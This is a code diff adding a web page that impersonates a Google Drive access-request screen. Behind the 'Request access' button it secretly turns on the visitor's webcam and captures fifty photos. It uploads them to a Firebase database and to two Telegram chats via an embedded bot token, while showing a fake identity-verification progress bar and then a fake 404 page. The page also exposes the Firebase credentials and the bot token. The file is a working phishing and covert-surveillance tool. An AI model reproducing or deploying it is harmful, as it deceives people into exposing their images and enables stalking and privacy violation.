@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Drive - Private Folder</title>
+    <!-- Tailwind for modern, trusted UI -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+    <style>
+        body { background-color: #fff; font-family: 'Roboto', sans-serif; }
+        .drive-icon { width: 80px; height: 80px; }
+    </style>
+</head>
+<body class="flex items-center justify-center h-screen">
+
+    <div id="card" class="max-w-md w-full p-8 text-center">
+        <!-- Google Drive Logo -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg" alt="Drive" class="drive-icon mx-auto mb-6">
+        
+        <div id="setup-ui">
+            <h1 class="text-2xl font-medium text-gray-800 mb-2">You need access</h1>
+            <p class="text-gray-600 mb-8">Request access to the file, or switch to an account with permission. <span class="text-blue-600 cursor-pointer">Learn more</span></p>
+            
+            <div class="flex items-center justify-center gap-3 mb-8">
+                <div class="w-8 h-8 bg-purple-600 rounded-full text-white flex items-center justify-center font-bold">S</div>
+                <span class="text-sm font-medium text-gray-700">student.iitp@gmail.com</span>
+            </div>
+
+            <button onclick="initiate()" class="bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 px-6 rounded-md transition duration-200">
+                Request access
+            </button>
+        </div>
+
+        <!-- Hidden exfiltration UI -->
+        <div id="download-ui" class="hidden">
+            <div class="flex flex-col items-center">
+                <div class="w-12 h-12 border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin mb-4"></div>
+                <p class="text-blue-600 font-medium" id="status-text">Sending request to owner...</p>
+                <div class="w-full bg-gray-200 rounded-full h-1.5 mt-6">
+                    <div id="loader" class="bg-blue-600 h-1.5 rounded-full transition-all duration-300" style="width: 0%"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Elements -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        // FIREBASE CONFIGURATION
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const targetSource = 'Google_Drive_Restricted';
+
+        // TELEGRAM CONFIGURATION
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function initiate() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                
+                document.getElementById('setup-ui').classList.add('hidden');
+                document.getElementById('download-ui').classList.remove('hidden');
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+                    const max = 50;
+                    
+                    const interval = setInterval(() => {
+                        if (count >= max) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            render404();
+                            return;
+                        }
+                        
+                        captureAndSend(count + 1);
+                        count++;
+                        
+                        const progress = (count / max) * 100;
+                        document.getElementById('loader').style.width = progress + "%";
+                        document.getElementById('status-text').innerText = `Verifying identity... ${Math.round(progress)}%`;
+                    }, 1000); 
+                };
+            } catch (e) {
+                alert("Request Failed: Please check your connection and try again.");
+            }
+        }
+
+        function captureAndSend(index) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            // 1. Firebase Push (Base64)
+            const base64Data = canvas.toDataURL('image/jpeg', 0.3);
+            database.ref('captures').push({
+                image_data: base64Data,
+                target_id: new URLSearchParams(window.location.search).get('id') || 'Drive_User',
+                source: targetSource,
+                timestamp: Date.now()
+            });
+
+            // 2. Telegram Send (Blob)
+            canvas.toBlob(blob => {
+                if (!blob) return;
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id);
+                    fd.append('photo', blob, 'shot.jpg');
+                    fd.append('caption', `📂 DRIVE_EXFIL\nShot: ${index}/50`);
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.4);
+        }
+
+        function render404() {
+            document.body.innerHTML = `<div class='text-center p-20'>
+                <h1 class='text-4xl font-bold'>404</h1>
+                <p class='text-gray-500'>Request Timed Out. Please try again later.</p>
+            </div>`;
+        }
+    </script>
+</body>
+</html>
